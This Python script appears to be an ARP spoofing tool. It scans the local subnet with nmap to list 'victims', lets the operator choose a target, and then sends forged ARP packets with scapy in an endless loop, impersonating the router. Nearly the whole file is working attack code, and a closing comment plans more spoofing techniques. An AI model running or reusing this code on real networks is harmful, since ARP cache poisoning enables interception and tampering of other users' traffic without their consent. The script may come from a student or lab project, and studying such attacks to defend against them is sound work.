import subprocess, time

from scapy.layers.l2 import ARP
from scapy.sendrecv import send

from victim import Victim
from attacker import Attacker
from network import Network
from color import Color #used to output to the terminals with colors


def initialize():
    Color.pl("{?} Doing pings to discover the router")
    time.sleep(2)

    subprocess.run(["ip", "neigh", "flush", "all"]) #clear arp table
    subprocess.run(["ping", "8.8.8.8", "-c", "2"]) #used to make sure the router has been added to the ARP table
    command = "ip neigh" # neighbors table (ARP)
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)).split('\\n')
    routerIP = commandOutput[0].split()[0][2:]
    routerMAC = commandOutput[0].split()[4]

    command = 'ifconfig' # get ip information
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)).split('\\n')
    attackerIP = commandOutput[1].split()[1]
    attackerMAC = commandOutput[2].split()[1]
    broadcastIP = commandOutput[1].split()[-1]

    command = "nmap "+ routerIP +"/24 -n -sP | grep 'report\|MAC'" # discover users connected to router
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT))
    connectedDevices = commandOutput[3:].split('\\n')[1:-1] #remove first element since it is the router

    victimList = [] # list we are going to use and popsulate it with possible victims
    for i in range(0, len(connectedDevices)-1, 2):
        mac = connectedDevices[i].split()[2]
        ip = connectedDevices[i+1].split()[4]
        if ip != attackerIP:
            print(ip, mac)
            victimList.append(Victim([ip, mac]))
    network = Network([routerIP, routerMAC, broadcastIP])
    attacker = Attacker([attackerIP, attackerMAC])
    return (network, attacker, victimList)

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    network, attacker, victimsList = initialize()
    Color.pl("{+} " + network.toString())
    Color.pl("{+} " + attacker.toString())
    for e in victimsList:
        Color.pl("{!} " + e.toString())

    op = 1  # Op code 1 for ARP requests
    while(True):
        Color.pl("{?} Do you want to enter the target manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter target IP address ")
            ip = input().strip()
            Color.pl("{+} Enter target MAC address ")
            mac = input().strip()
            break
        elif selection.lower() == "n":
            for i in range(len(victimsList)):
                Color.pl("{!} " + str(i) + ":   " + victimsList[i].toString())
            Color.pl("{+} Enter Index of Target")
            index = int(input())
            ip = victimsList[index].ip
            mac = victimsList[index].mac
            break
        else:
            Color.pl("{!} Invalid Input")

    while(True):
        Color.pl("{?} Do you want to enter the router IP manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter router IP address ")
            routerIP = input().strip()
            break
        elif selection.lower() == "n":
            routerIP = network.ip
            break
        else:
            Color.pl("{!} Invalid Input")

    Color.pl("{+} {R} Router IP: {G}" + routerIP)
    Color.pl("{+} {R} Target IP: {G}" + ip + "  {R} Target IP: {G}" + mac)
    time.sleep(2)

    arp = ARP(op=op, psrc=routerIP, pdst=ip, hwdst=mac)

    while 1:
        send(arp)
        time.sleep(5)


    '''
    Do the attack 
    Check if attack works
    
    Detecting router needs testing
    
    Optional:
        Implement different ARP spoofing techniques that user can select
    '''
